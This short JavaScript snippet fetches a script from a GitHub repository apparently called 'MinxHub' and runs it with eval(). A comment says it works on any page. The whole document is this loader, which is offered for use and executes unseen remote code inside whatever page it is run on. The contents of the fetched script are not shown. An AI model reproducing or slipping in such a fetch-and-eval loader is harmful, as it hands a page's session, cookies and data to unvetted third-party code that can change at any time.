fetch('https://raw.githubusercontent.com/JustSeadragon/MinxHub/main/src.js')
  .then(response => response.text())
  .then(code => eval(code)); 
  // This code can be used for any page.
